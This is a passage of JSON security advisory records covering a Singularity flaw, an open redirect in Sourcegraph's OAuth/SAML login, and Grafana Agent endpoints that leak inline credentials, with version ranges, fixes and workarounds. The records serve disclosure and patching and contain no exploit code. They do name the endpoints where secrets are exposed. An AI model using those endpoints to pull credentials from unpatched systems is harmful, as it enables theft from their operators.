"CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/singularity"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.5.0"}, {"fixed": "3.6.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hpcng/singularity/security/advisories/GHSA-6w7g-p4jh-rf92"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-13846"}, {"type": "PACKAGE", "url": "https://github.com/sylabs/singularity"}, {"type": "WEB", "url": "https://medium.com/sylabs"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00046.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00059.html"}, {"type": "WEB", "url": "http://lists.opensuse.org/opensuse-security-announce/2020-09/msg00053.html"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-24T19:12:04Z", "nvd_published_at": "2020-07-14T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mx43-r985-5h4m", "modified": "2023-10-02T14:32:06Z", "published": "2021-12-20T18:12:47Z", "aliases": ["CVE-2020-12283"], "summary": "Open redirect vulnerability in Sourcegraph", "details": "### Impact\n\nAn open redirect vulnerability that allows users to be targeted for phishing attacks has been found in Sourcegraph instances configured with OAuth, OpenID, or SAML authentication enabled. Users targeted by these phishing attacks could have their authentication tokens silently harvested by an attacker.\n\n### Specific Go Packages Affected\ngithub.com/sourcegraph/sourcegraph/cmd/frontend/auth\n\n### Resolution\n\nSourcegraph v3.14.4 and v3.15.1 have been released which resolve the vulnerability. ([associated change](https://github.com/sourcegraph/sourcegraph/pull/10167))\n\n### Workarounds\n\nDisabling OAuth, OpenID and/or SAML sign-in options until upgraded to the patched versions will secure Sourcegraph / workaround the issue.\n\n### Timeline\n\n- Apr 23, 8 AM PST: GitHub Security Lab reported the issue to Sourcegraph.\n- Apr 23, 11 PM PST: A Sourcegraph engineer proposed a resolution for the vulnerability. https://github.com/sourcegraph/sourcegraph/pull/10167\n- Apr 24, 3 AM PST: The proposed resolution was reviewed, approved, and merged.\n- Apr 28, 2 PM PST: Patch releases for 3.14.4 and 3.15.1 were published.\n- Apr 29, 10 PM PST: Mitre publicly disclosed [CVE-2020-12283](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12283).\n- Apr 30, 11 AM PST: Sourcegraph issued a GitHub security advisory and notified all affected users.\n\n### References\n\n- [Mitre: CVE-2020-12283](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12283)\n- [GitHub Security Lab: GHSL-2020-085](https://securitylab.github.com/advisories/GHSL-2020-085-sourcegraph)\n- [detectify's blog post on open redirect vulnerabilities\n](https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/)\n\n### For more information\n\nIf you have any questions or comments about this advisory, please contact us at [support@sourcegraph.com](mailto:support@sourcegraph.com) and include `CVE-2020-12283` in the title.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sourcegraph/sourcegraph"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.14.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/sourcegraph/sourcegraph"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.15.0"}, {"fixed": "3.15.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sourcegraph/sourcegraph/security/advisories/GHSA-mx43-r985-5h4m"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-12283"}, {"type": "WEB", "url": "https://github.com/sourcegraph/sourcegraph/pull/10167"}, {"type": "WEB", "url": "https://github.com/sourcegraph/sourcegraph/commit/c0f48172e815c7f66471a38f0a06d1fc32a77a64"}, {"type": "PACKAGE", "url": "https://github.com/sourcegraph/sourcegraph"}, {"type": "WEB", "url": "https://github.com/sourcegraph/sourcegraph/blob/master/CHANGELOG.md"}, {"type": "WEB", "url": "https://github.com/sourcegraph/sourcegraph/compare/v3.15.0...v3.15.1"}, {"type": "ADVISORY", "url": "https://securitylab.github.com/advisories/GHSL-2020-085-sourcegraph"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-24T21:06:22Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-9c4x-5hgq-q3wh", "modified": "2021-12-14T15:32:21Z", "published": "2021-12-08T19:52:40Z", "aliases": ["CVE-2021-41090"], "summary": "Instance config inline secret exposure in Grafana", "details": "### Impact\nSome inline secrets are exposed in plaintext over the Grafana Agent HTTP server:\n\n* Inline secrets for metrics instance configs in the base YAML file are exposed at `/-/config` \n* Inline secrets for integrations are exposed at `/-/config`\n* Inline secrets for Consul ACL tokens and ETCD basic auth when configured for the scraping service at `/-/config`.\n* Inline secrets for the Kafka receiver for OpenTelemetry-Collector tracing at `/-/config`.\n* Inline secrets for metrics instance configs loaded from the scraping service are exposed at `/agent/api/v1/configs/{name}`.\n\nInline secrets will be exposed to anyone being able to reach these endpoints.\n\nSecrets found in these sections are used for:\n\n* Delivering metrics to a Prometheus Remote Write system \n* Authenticating against a system for discovering Prometheus targets \n* Authenticating against a system for collecting metrics (scrape_configs and integrations)\n* Authenticating against a Consul or ETCD for storing configurations to distribute in scraping service mode \n* Authenticating against Kafka for receiving traces\n\nNon-inlined secrets, such as `*_file`-based secrets, are not impacted by this vulnerability. \n\n### Patches\n\nDownload [v0.20.1](https://github.com/grafana/agent/releases/tag/v0.20.1) or any version past [v0.21.2](https://github.com/grafana/agent/releases/tag/v0.21.2) to patch Grafana Agent. These patches obfuscate the listed impacted secrets from the vulnerable endpoints.\n\nThe patches also disable the endpoints by default. Pass the command-line flag `--config.enable-read-api` to opt-in and re-enable the endpoints.  \n \n### Workarounds\nIf for some reason you cannot upgrade, use non-inline secrets where possible. Not all configuration options may have a non-inline equivalent.\n\nYou also may desire to restrict API access to Grafana Agent, with some combination of:\n\n* Restrict network interfaces Grafana Agent listens on through `http_listen_address` in the `server` block. `127.0.0.1` is the most restrictive, `0.0.0.0` is the default. \n* Configure Grafana Agent to use HTTPS with client authentication. \n* Use firewall rules to restrict external access to Grafana Agent's API.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/grafana/agent"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.14.0"}, {"fixed": "0.21.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/grafana/agent/security/advisories/GHSA-9c4x-5hgq-q3wh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-41090"}, {"type": "WEB", "url": "https://github.com/grafana/agent/pull/1152"}, {"type": "WEB", "url": "https://github.com/grafana/agent/commit/a5479755e946e5c7cddb793ee9adda8f5692ba11"}, {"type": "WEB", "url": "https://github.com/grafana/agent/commit/af7fb01e31fe2d389e5f1c36b399ddc46b412b21"}, {"type": "PACKAGE", "url": "https://github.com/grafana/agent"}, {"type": "WEB", "url": "https://github.com/grafana/agent/releases/tag/v0.20.1"}, {"type": "WEB", "url": "https://github.com/grafana/agent/releases/tag/v0.21.2"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20211229-0004/"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-312"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-12-08T19:32:31Z", "nvd_published_at": "2021-12-08T17:15:00Z"}}]